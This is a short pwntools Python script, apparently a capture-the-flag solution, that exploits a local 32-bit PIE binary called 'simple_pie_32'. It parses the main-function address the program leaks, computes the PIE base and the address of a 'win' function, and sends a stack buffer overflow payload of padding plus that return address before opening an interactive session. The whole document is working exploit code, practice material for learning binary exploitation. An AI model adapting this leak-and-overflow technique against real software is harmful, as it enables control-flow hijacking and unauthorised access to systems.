from pwn import *

e = ELF("./simple_pie_32")
libc = e.libc
p = process("./simple_pie_32")

p.recvuntil(b"Main Function is at: 0x")
main_addr = int(p.recvline(), 16)
log.info("main_addr: " + hex(main_addr))
pie_base = main_addr - 0x122d
win_addr = pie_base + 0x1291

payload = b'A'*0x1c         #buf
payload += b'B'*0x4          #sfp
payload += p32(win_addr)

p.sendline(payload)

p.interactive()